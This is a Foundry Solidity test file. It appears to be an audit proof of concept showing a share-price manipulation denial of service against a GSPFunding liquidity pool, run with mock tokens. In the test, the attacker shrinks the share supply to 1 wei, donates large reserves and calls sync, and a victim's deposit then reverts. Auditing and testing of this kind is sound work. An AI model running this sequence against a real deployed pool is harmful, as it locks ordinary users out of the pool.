// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "../../contracts/GasSavingPool/impl/GSPFunding.sol";
import "../../contracts/mock/MockERC20.sol";

contract ExploitTest is Test {
    GSPFunding public gsp;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;
    
    address public attacker;
    address public victim;
    
    uint256 constant INITIAL_ATTACKER_BALANCE = 2000e18;
    uint256 constant VICTIM_BALANCE = 1000e18;
    
    function setUp() public {
        // Deploy mock tokens
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        
        // Deploy GSP contract
        gsp = new GSPFunding();
        
        // Initialize GSP with required parameters
        address maintainer = address(this);
        address[] memory maintainers = new address[](1);
        maintainers[0] = maintainer;
        
        gsp.init(
            maintainer,
            address(baseToken),
            address(quoteToken),
            0,
            0,
            1e18, // _I_ = 1
            0,
            false
        );
        
        // Setup attacker and victim accounts
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        // Fund attacker with tokens
        baseToken.mint(attacker, INITIAL_ATTACKER_BALANCE);
        quoteToken.mint(attacker, INITIAL_ATTACKER_BALANCE);
        
        // Fund victim with tokens
        baseToken.mint(victim, VICTIM_BALANCE);
        quoteToken.mint(victim, VICTIM_BALANCE);
    }
    
    function testSharePriceManipulationDOS() public {
        // ============ STEP 1: Attacker initializes pool with 1001 shares ============
        vm.startPrank(attacker);
        
        // Transfer 1001 base and quote tokens to initialize the pool
        baseToken.transfer(address(gsp), 1001);
        quoteToken.transfer(address(gsp), 1001);
        
        // Buy shares - this will mint 1001 shares to attacker
        (uint256 initialShares, , ) = gsp.buyShares(attacker);
        
        console.log("Step 1: Initial shares minted to attacker:", initialShares);
        assertEq(initialShares, 1001, "Initial shares should be 1001");
        
        // ============ STEP 2: Attacker sells back 1000 shares, keeping only 1 wei ============
        
        // Sell 1000 shares, keeping 1 share (wei)
        (uint256 baseOut, uint256 quoteOut) = gsp.sellShares(
            1000,
            attacker,
            0,
            0,
            "",
            block.timestamp
        );
        
        console.log("Step 2: Shares sold back:", 1000);
        console.log("Step 2: Base tokens received:", baseOut);
        console.log("Step 2: Quote tokens received:", quoteOut);
        console.log("Step 2: Remaining shares:", gsp.balanceOf(attacker));
        
        assertEq(gsp.balanceOf(attacker), 1, "Attacker should have 1 wei share remaining");
        assertEq(gsp.totalSupply(), 1, "Total supply should be 1 wei");
        
        // ============ STEP 3: Attacker donates large amount to inflate reserves ============
        
        // Donate 1000e18 tokens to inflate the reserves
        uint256 donationAmount = 1000e18;
        baseToken.transfer(address(gsp), donationAmount);
        quoteToken.transfer(address(gsp), donationAmount);
        
        // Sync reserves to update the pool state
        gsp.sync();
        
        console.log("Step 3: Donated base tokens:", donationAmount);
        console.log("Step 3: Donated quote tokens:", donationAmount);
        console.log("Step 3: Base reserve after donation:", gsp._BASE_RESERVE_());
        console.log("Step 3: Quote reserve after donation:", gsp._QUOTE_RESERVE_());
        
        vm.stopPrank();
        
        // ============ STEP 4: Victim attempts to buy shares with reasonable amount ============
        
        vm.startPrank(victim);
        
        // Victim tries to deposit 100e18 tokens (much less than attacker's donation * 1001)
        uint256 victimDeposit = 100e18;
        baseToken.transfer(address(gsp), victimDeposit);
        quoteToken.transfer(address(gsp), victimDeposit);
        
        console.log("Step 4: Victim attempting to deposit:", victimDeposit);
        
        // Calculate expected mintRatio
        uint256 baseReserve = gsp._BASE_RESERVE_();
        uint256 quoteReserve = gsp._QUOTE_RESERVE_();
        uint256 baseInputRatio = (victimDeposit * 1e18) / baseReserve;
        uint256 quoteInputRatio = (victimDeposit * 1e18) / quoteReserve;
        uint256 mintRatio = baseInputRatio < quoteInputRatio ? baseInputRatio : quoteInputRatio;
        uint256 expectedShares = (gsp.totalSupply() * mintRatio) / 1e18;
        
        console.log("Step 4: Calculated mintRatio:", mintRatio);
        console.log("Step 4: Expected shares to mint:", expectedShares);
        console.log("Step 4: Total supply:", gsp.totalSupply());
        
        // This should revert with "MINT_AMOUNT_NOT_ENOUGH" because shares < 1001
        vm.expectRevert(bytes("MINT_AMOUNT_NOT_ENOUGH"));
        gsp.buyShares(victim);
        
        console.log("Step 4: DOS SUCCESSFUL - Victim cannot buy shares!");
        
        vm.stopPrank();
        
        // ============ VERIFICATION ============
        
        // Verify the attack succeeded by showing:
        // 1. Attacker still holds 1 wei of shares
        assertEq(gsp.balanceOf(attacker), 1, "Attacker maintains 1 wei share");
        
        // 2. Total supply is only 1 wei
        assertEq(gsp.totalSupply(), 1, "Total supply manipulated to 1 wei");
        
        // 3. Reserves are inflated
        assertTrue(gsp._BASE_RESERVE_() > 1000e18, "Base reserve inflated");
        assertTrue(gsp._QUOTE_RESERVE_() > 1000e18, "Quote reserve inflated");
        
        // 4. Victim cannot participate with reasonable amounts
        // (already demonstrated by the revert above)
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("The pool is now in a DOS state where normal users cannot buy shares");
        console.log("unless they deposit an amount >= reserves * 1001");
    }
}